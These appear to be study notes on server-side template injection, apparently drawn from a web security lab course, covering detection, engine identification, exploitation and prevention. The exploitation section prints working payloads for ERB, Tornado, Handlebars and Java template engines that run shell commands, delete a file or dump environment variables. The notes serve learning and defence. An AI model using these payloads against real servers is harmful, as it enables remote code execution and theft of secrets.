# What is server-side template injection?
Attacker injects a payload using native template syntax. Payload is executed server-side. SSTI happens when user input is concatenated directly into a template (rather than being passed as data). Arbitrary template directives can then be injected to take control of the server (remote code execution, arbitrary read/write).

Example (passed as data, NOT vulnerable): 
```
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
```

Example (concatenated user input, VULNERABLE):
```
$output = $twig->render("Dear " . $_GET['name']); 
```
The `name` parameter can be used for SSTI. 

Example payload:
```
http://vulnerable-website.com/?name={{bad-stuff-here}} 
```

# Constructing SSTI attacks
## Detect
### Plaintext context
Consider a template that has the vulnerable code: 
```
render('Hello' + username)
```

A possible payload is: 
```
http://vulnerable-website.com/?username=${7*7}
```

If the output shows `Hello 49`, we know that the math operation is evaluated server-side and is a good proof-of-concept. The specific syntax required will depend on the template engine. 

### Code context
User input can be placed within a template expression. For example, consider the vulnerable code: 
```
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

The resulting URL looks like: 
```
http://vulnerable-website.com/?greeting=data.username
```

and renders as `Hello Carlos`, for example.

First, check to see that the parameter doesn't have a direct XSS vulnerability by injecting HTML: 
```
http://vulnerable-website.com/?greeting=data.username<tag> 
```

If there is no XSS, the output will have a blank entry, encoded tags, or an error message. 

Next, try to break out of the statement using templating syntax and attempt HTML injection right after: 
```
http://vulnerable-website.com/?greeting=data.username}}<tag> 
```

If the arbitrary HTML is rendered, there is SSTI. 

## Identify
After detecting a potential spot for SSTI, the next step is to identify the template engine. 

Sometimes, just submitting invalid syntax is enough because of informational error messages. For example, `<%=foobar%>` can trigger an ERB engine error. 

You can test different payloads and use process of elimination from what seems valid/invalid: 

![[c73b9c7bacf2b20cd5d972ffa04354e3-1.png]]

Be careful, though, as some payloads can be valid in multiple template engines. 
In that case, you can try different payloads and differentiate between the responses and determine a good guess. 

# Exploiting SSTI
## Read
The most important thing to keep in mind and apply is reading. Read about the template syntax, any "security" warnings or sections in the documentation, and known exploits. 

Example RCE payload (plaintext-context, Ruby ERB): 
```
<%= system("rm /home/carlos/morale.txt") %>
``` 

Example RCE payload (code-context, Tornado):
```
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

Remember to look for documented exploits, like those from PayloadsAllTheThings.

Example RCE payload (Handlebars): 
```
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('ls -la');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

## Explore
After exploitation, make sure to explore a bit. 

Many template engines expose a "self" or "environment" object of some kind, which acts as a namespace containing objects, methods, and attributes supported by the template engine. 

In Java-based templating languages, you can sometimes list all variables in the environment using: 
```
${T(java.lang.System).getenv()} 
```

There are also wordlists for brute-forcing variable names.

Pay specific attention to developer-supplied custom objects because those can leak sensitive information or exploitable methods. Remember that RCE is not the only goal. Directory traversal, for example, can be catastrophic too.

# How to prevent SSTI vulnerabilities
The best way to prevent server-side template injection is to not allow any users to modify or submit new templates. 
- always use a "logic-less" template engine, such as Mustache, unless absolutely necessary. 
- only execute users' code in a sandboxed environment where potentially dangerous modules and functions have been removed altogether.
- accept that arbitrary code execution is inevitable and apply your own sandboxing by deploying your template environment in a locked-down container (like Docker)